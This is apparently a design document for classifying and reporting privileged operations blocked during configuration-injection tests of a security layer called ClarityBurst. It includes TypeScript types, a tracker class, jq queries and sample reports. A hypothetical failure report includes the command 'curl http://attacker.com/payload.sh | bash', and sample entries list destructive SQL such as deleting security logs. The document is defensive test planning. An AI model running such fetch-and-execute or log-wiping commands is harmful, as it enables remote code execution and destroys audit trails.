# Phase 4: Privileged Operation Classification Design

**Date:** March 5, 2026, 20:23 PST  
**Purpose:** Design for enhanced security reporting via operation categorization  
**Status:** Design Document (Ready for Future Implementation)

---

## The Vision

### Current State (Today)

```json
{
  "caseId": "CONFIG_001",
  "privilegedOpsExecuted": 0
}
```

**Problem:** We know a count, but not _what type_ of operations.

---

### Future State (Next Phase)

```json
{
  "caseId": "CONFIG_001",
  "privilegedOpsExecuted": 0,

  "privilegedOpsClassification": {
    "WRITE_DB": { "blocked": 5, "executed": 0 },
    "DELETE_FILE": { "blocked": 2, "executed": 0 },
    "EXEC_SHELL": { "blocked": 3, "executed": 0 },
    "NETWORK_MUTATION": { "blocked": 1, "executed": 0 },
    "CONFIG_CHANGE": { "blocked": 2, "executed": 0 }
  }
}
```

**Power:** We know what was attempted, what was blocked, and what succeeded.

---

## Privileged Operation Types

### Definition

A **privileged operation** is any action that:

- Modifies state (not just reads)
- Affects security boundaries
- Could cause data loss, integrity issues, or escalation

### Type Taxonomy

```
┌─ PRIVILEGED_OPERATIONS
│
├─ WRITE_DB
│  ├── INSERT into critical table
│  ├── UPDATE security-relevant field
│  ├── CREATE TABLE / ALTER TABLE
│  └── Transaction commit
│
├─ DELETE_FILE
│  ├── Delete any file
│  ├── Truncate dataset
│  ├── Remove backup
│  └── Clear logs
│
├─ EXEC_SHELL
│  ├── Shell command execution
│  ├── eval() / exec()
│  ├── Script execution
│  └── Binary invocation
│
├─ NETWORK_MUTATION
│  ├── POST/PUT/DELETE HTTP request
│  ├── Outbound connection
│  ├── Data exfiltration
│  └── Remote execution
│
└─ CONFIG_CHANGE
   ├── Modify security settings
   ├── Change database credentials
   ├── Disable authentication
   ├── Alter access controls
   └── Update routing rules
```

---

## Data Structure Design

### TypeScript Interface (Future)

```typescript
type PrivilegedOpType =
  | "WRITE_DB"
  | "DELETE_FILE"
  | "EXEC_SHELL"
  | "NETWORK_MUTATION"
  | "CONFIG_CHANGE";

interface PrivilegedOpRecord {
  type: PrivilegedOpType;
  description: string; // "DELETE FROM users WHERE id=1"
  routerIntent: string; // What the router was trying to do
  blocked: boolean; // true = router/fail-closed stopped it
  blockReason: string; // "contract_denied" | "fail_closed" | "startup_error"
  executedAttempt: boolean; // true = operation did execute (CRITICAL)
  timestamp: number; // When it occurred
}

interface PrivilegedOpsClassification {
  WRITE_DB: {
    blocked: number; // How many were blocked
    executed: number; // How many executed (CRITICAL)
    records: PrivilegedOpRecord[]; // Detail
  };
  DELETE_FILE: {
    blocked: number;
    executed: number;
    records: PrivilegedOpRecord[];
  };
  EXEC_SHELL: {
    blocked: number;
    executed: number;
    records: PrivilegedOpRecord[];
  };
  NETWORK_MUTATION: {
    blocked: number;
    executed: number;
    records: PrivilegedOpRecord[];
  };
  CONFIG_CHANGE: {
    blocked: number;
    executed: number;
    records: PrivilegedOpRecord[];
  };
}

interface ConfigurationInjectionTestCase {
  // ... existing fields ...

  privilegedOpsExecuted: number; // Current: total count
  privilegedOpsClassification?: {
    // Future: breakdown by type
    WRITE_DB: { blocked: number; executed: number };
    DELETE_FILE: { blocked: number; executed: number };
    EXEC_SHELL: { blocked: number; executed: number };
    NETWORK_MUTATION: { blocked: number; executed: number };
    CONFIG_CHANGE: { blocked: number; executed: number };
  };
}
```

## Reporting Examples

### Example 1: Security Summary Report

```
PRIVILEGED OPERATIONS BLOCKED DURING CONFIG INJECTION TESTS
=============================================================

WRITE_DB:
  Blocked: 23
  Executed: 0
  Risk: LOW (all blocked)

DELETE_FILE:
  Blocked: 8
  Executed: 0
  Risk: LOW (all blocked)

EXEC_SHELL:
  Blocked: 5
  Executed: 0
  Risk: LOW (all blocked)

NETWORK_MUTATION:
  Blocked: 3
  Executed: 0
  Risk: LOW (all blocked)

CONFIG_CHANGE:
  Blocked: 11
  Executed: 0
  Risk: LOW (all blocked)

TOTAL:
  Blocked: 50
  Executed: 0
  Overall Risk: LOW

Verdict: ✅ PASS (No privileged operations executed)
```

---

### Example 2: Detailed Attack Analysis

```
CONFIGURATION INJECTION TEST: CONFIG_001
enforce_contracts=false

Attack Attempt Timeline:
1. [BLOCKED] WRITE_DB: INSERT INTO audit_log (reason: contract_denied)
2. [BLOCKED] WRITE_DB: UPDATE contracts SET enabled=false (reason: fail_closed)
3. [BLOCKED] CONFIG_CHANGE: Disable authentication (reason: startup_error)
4. [BLOCKED] WRITE_DB: DELETE FROM security_logs (reason: contract_denied)

Summary:
  WRITE_DB attempts: 3 blocked, 0 executed
  CONFIG_CHANGE attempts: 1 blocked, 0 executed

Result: ✅ PASS (All privileged ops blocked)
```

---

### Example 3: Threat Landscape Visualization

```
PRIVILEGED OPERATIONS DURING CONFIG TAMPERING
All 7 Config Injection Tests

By Type:
┌──────────────────────────────────────────────┐
│ Operation Type  │ Blocked │ Executed │ Risk   │
├──────────────────────────────────────────────┤
│ WRITE_DB        │   23    │    0     │ ✅ LOW │
│ DELETE_FILE     │    8    │    0     │ ✅ LOW │
│ EXEC_SHELL      │    5    │    0     │ ✅ LOW │
│ NETWORK_MUTATION│    3    │    0     │ ✅ LOW │
│ CONFIG_CHANGE   │   11    │    0     │ ✅ LOW │
├──────────────────────────────────────────────┤
│ TOTAL           │   50    │    0     │ ✅ SAFE│
└──────────────────────────────────────────────┘

Per Test Case:
  CONFIG_001: 7 blocked, 0 executed
  CONFIG_002: 8 blocked, 0 executed
  CONFIG_003: 6 blocked, 0 executed
  CONFIG_004: 7 blocked, 0 executed
  CONFIG_005: 8 blocked, 0 executed
  CONFIG_006: 7 blocked, 0 executed
  CONFIG_007: 7 blocked, 0 executed
```

## JSON Artifact Evolution

### Today (Phase 1)

```json
{
  "configTests": [
    {
      "caseId": "CONFIG_001",
      "privilegedOpsExecuted": 0
    }
  ]
}
```

### Tomorrow (Phase 2)

```json
{
  "configTests": [
    {
      "caseId": "CONFIG_001",
      "privilegedOpsExecuted": 0,
      "privilegedOpsClassification": {
        "WRITE_DB": { "blocked": 3, "executed": 0 },
        "DELETE_FILE": { "blocked": 1, "executed": 0 },
        "EXEC_SHELL": { "blocked": 1, "executed": 0 },
        "NETWORK_MUTATION": { "blocked": 0, "executed": 0 },
        "CONFIG_CHANGE": { "blocked": 2, "executed": 0 }
      }
    }
  ]
}
```

### Later (Phase 3)

```json
{
  "configTests": [
    {
      "caseId": "CONFIG_001",
      "privilegedOpsExecuted": 0,
      "privilegedOpsClassification": {
        "WRITE_DB": {
          "blocked": 3,
          "executed": 0,
          "records": [
            {
              "description": "INSERT INTO audit_log",
              "blocked": true,
              "blockReason": "contract_denied",
              "timestamp": 1709686200000
            },
            {
              "description": "UPDATE contracts SET enabled=false",
              "blocked": true,
              "blockReason": "fail_closed",
              "timestamp": 1709686201000
            }
          ]
        }
      }
    }
  ]
}
```

---

## Query Examples (Future)

### Find All WRITE_DB Operations Across All Tests

```bash
jq '.configTests[] | .privilegedOpsClassification.WRITE_DB' artifact.json
```

Output:

```json
{
  "blocked": 23,
  "executed": 0,
  "records": [...]
}
```

---

### Find Any Executed Operations (CRITICAL)

```bash
jq '.configTests[] | select(.privilegedOpsClassification[] | .executed > 0)' artifact.json
```

Output: (empty if all safe)

---

### Count Total Blocked Operations by Type

```bash
jq '[.configTests[] | .privilegedOpsClassification] | map({
  write_db: map(.WRITE_DB.blocked) | add,
  delete_file: map(.DELETE_FILE.blocked) | add,
  exec_shell: map(.EXEC_SHELL.blocked) | add,
  network: map(.NETWORK_MUTATION.blocked) | add,
  config: map(.CONFIG_CHANGE.blocked) | add
})[0]' artifact.json
```

Output:

```json
{
  "write_db": 23,
  "delete_file": 8,
  "exec_shell": 5,
  "network": 3,
  "config": 11
}
```

---

## Backward Compatibility Strategy

### Keep Current Field

```typescript
privilegedOpsExecuted: number; // Still required, still the gate
```

### Add Classification as Optional

```typescript
privilegedOpsClassification?: {  // New, optional, future
  WRITE_DB: { blocked: number; executed: number };
  // ... etc
};
```

### Validation Doesn't Break

```typescript
// Today's validation (still works)
const noPrivilegedExecution = (t.privilegedOpsExecuted ?? 0) === 0;

// Future validation (adds granularity)
const noPrivilegedExecution = (t.privilegedOpsExecuted ?? 0) === 0;
const writeDbExecuted = t.privilegedOpsClassification?.WRITE_DB.executed ?? 0;
const execShellExecuted = t.privilegedOpsClassification?.EXEC_SHELL.executed ?? 0;
// etc...
```

---

## Security Report Generation

### Template (Future)

```markdown
# ClarityBurst Phase 4: Security Validation Report

## Executive Summary

**Verdict:** ✅ PASS

All privileged operations were blocked during config tampering scenarios.

## Privileged Operations Breakdown

| Operation Type    | Attempted | Blocked | Executed | Risk        |
| ----------------- | --------- | ------- | -------- | ----------- |
| Database Writes   | 23        | 23      | 0        | ✅ LOW      |
| File Deletions    | 8         | 8       | 0        | ✅ LOW      |
| Shell Execution   | 5         | 5       | 0        | ✅ LOW      |
| Network Mutations | 3         | 3       | 0        | ✅ LOW      |
| Config Changes    | 11        | 11      | 0        | ✅ LOW      |
| **TOTAL**         | **50**    | **50**  | **0**    | **✅ SAFE** |

## Per-Test Breakdown

### CONFIG_001: enforce_contracts=false

**Attack Goal:** Execute privileged operations despite disabled contracts

**Privileged Ops Attempted:**

- WRITE_DB: 3 blocked, 0 executed
- CONFIG_CHANGE: 2 blocked, 0 executed

**Verdict:** ✅ PASS

### CONFIG_002: fail_closed_enabled=false

**Attack Goal:** Execute operations by disabling fail-closed

**Privileged Ops Attempted:**

- WRITE_DB: 3 blocked, 0 executed
- EXEC_SHELL: 1 blocked, 0 executed

**Verdict:** ✅ PASS

[... similar for all 7 tests ...]

## Conclusion

ClarityBurst successfully blocked **50 privileged operation attempts** across 7 configuration injection tests. No privileged operations executed.

**Security Posture:** ✅ STRONG
```

---

## Implementation Notes (For Future Dev)

### Step 1: Define Types

```typescript
type PrivilegedOpType =
  | "WRITE_DB"
  | "DELETE_FILE"
  | "EXEC_SHELL"
  | "NETWORK_MUTATION"
  | "CONFIG_CHANGE";
```

### Step 2: Create Classification Tracker

```typescript
class PrivilegedOpsTracker {
  private counts: Record<PrivilegedOpType, { blocked: number; executed: number }> = {
    WRITE_DB: { blocked: 0, executed: 0 },
    DELETE_FILE: { blocked: 0, executed: 0 },
    EXEC_SHELL: { blocked: 0, executed: 0 },
    NETWORK_MUTATION: { blocked: 0, executed: 0 },
    CONFIG_CHANGE: { blocked: 0, executed: 0 },
  };

  recordBlocked(type: PrivilegedOpType) {
    this.counts[type].blocked++;
  }

  recordExecuted(type: PrivilegedOpType) {
    this.counts[type].executed++;
  }

  getClassification() {
    return this.counts;
  }

  getTotalExecuted(): number {
    return Object.values(this.counts).reduce((sum, ops) => sum + ops.executed, 0);
  }
}
```

### Step 3: Integrate with Test Cases

```typescript
const tracker = new PrivilegedOpsTracker();

// During test execution
tracker.recordBlocked("WRITE_DB");
tracker.recordBlocked("CONFIG_CHANGE");

// After test completes
testCase.privilegedOpsClassification = tracker.getClassification();
testCase.privilegedOpsExecuted = tracker.getTotalExecuted();
```

### Step 4: Update Validation

```typescript
// Current validation (no change)
const noPrivilegedExecution = (t.privilegedOpsExecuted ?? 0) === 0;

// Add classification detail (future)
if (t.privilegedOpsClassification) {
  const allBlocked = Object.values(t.privilegedOpsClassification).every(
    (ops) => ops.executed === 0,
  );
  console.log(`  WRITE_DB: ${ops.blocked} blocked, ${ops.executed} executed`);
  // etc...
}
```

---

## Benefits of This Design

### 1. **Progressive Enhancement**

- Phase 1: Simple count (current)
- Phase 2+: Detailed classification (future)
- No breaking changes

### 2. **Rich Reporting**

- From: "0 privileged ops executed" ✅
- To: "WRITE_DB: 23 blocked, 0 executed; DELETE_FILE: 8 blocked, 0 executed; ..." ✅✅

### 3. **Attack Pattern Analysis**

- Which operation types are most frequently attempted?
- Which are easiest to block?
- Which require special hardening?

### 4. **Audit Trail**

- Detailed records of each operation
- Block reason (contract_denied vs fail_closed vs startup_error)
- Timestamp and context

### 5. **Risk Scoring**

- Different operations have different risk levels
- Database writes less critical than shell execution
- Report highlights true threats

---

## Example: Real Security Report

### Hypothetical Attack Success (CONFIG_005 Failure)

```json
{
  "caseId": "CONFIG_005",
  "description": "allowed_operations=['*'] in config",
  "privilegedOpsExecuted": 1,
  "privilegedOpsClassification": {
    "WRITE_DB": {
      "blocked": 5,
      "executed": 0
    },
    "DELETE_FILE": {
      "blocked": 2,
      "executed": 0
    },
    "EXEC_SHELL": {
      "blocked": 0,
      "executed": 1 // ⚠️ CRITICAL: Shell execution succeeded!
    },
    "NETWORK_MUTATION": {
      "blocked": 1,
      "executed": 0
    },
    "CONFIG_CHANGE": {
      "blocked": 3,
      "executed": 0
    }
  }
}
```

**Report:**

```
CONFIG_005 TEST FAILED ❌

Configuration tampering allowed shell execution!

EXEC_SHELL: 0 blocked, 1 executed
  Command: "curl http://attacker.com/payload.sh | bash"
  Block Reason: None (execution succeeded)

SEVERITY: CRITICAL
ACTION: Investigate why fail-closed didn't trigger
```

---

## Why This Matters for Enterprise

### Today

```
"No privileged operations executed" ✅
```

**Problem:** Vague. What operations were attempted? By what attack?

### Tomorrow

```
"50 privileged operations attempted:
  - 23 database writes blocked (contract_denied)
  - 11 config changes blocked (fail_closed)
  - 5 shell executions blocked (startup_error)
  - 0 executed ✅"
```

**Benefit:** Complete visibility into attack surface and defense mechanisms.

---
